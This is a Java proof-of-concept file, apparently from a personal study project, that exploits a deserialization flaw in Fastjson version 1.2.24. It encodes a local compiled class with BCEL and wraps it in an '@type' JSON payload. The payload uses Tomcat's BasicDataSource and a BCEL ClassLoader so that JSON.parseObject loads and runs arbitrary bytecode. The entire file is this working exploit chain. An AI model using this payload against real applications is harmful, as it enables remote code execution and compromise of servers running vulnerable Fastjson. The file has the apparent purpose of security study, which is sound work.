package Fastjson.version24;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Fastjson.version24
 * @Author: Clown
 * @CreateTime: 2023-10-11  19:38
 */
public class poc24Bcel {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        String classFilePath = "E:\\Python\\B.class"; // 替换为你的类文件路径

        // 1. 读取类文件的字节码
        FileInputStream fis = new FileInputStream(classFilePath);
        BufferedInputStream bis = new BufferedInputStream(fis);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int bytesRead;
        byte[] buffer = new byte[4096];
        while ((bytesRead = bis.read(buffer)) != -1) {
            bos.write(buffer, 0, bytesRead);
        }
        bis.close();

        // 2. 获取字节码的字节数组
        byte[] bytecode = bos.toByteArray();

//        ClassLoader classLoader = new ClassLoader();//实例化Classloader
        String code = Utility.encode(bytecode,true);
//        classLoader.loadClass("$$BCEL$$"+code).newInstance();
        String str = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$"+code+"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSON.parseObject(str);
    }
}
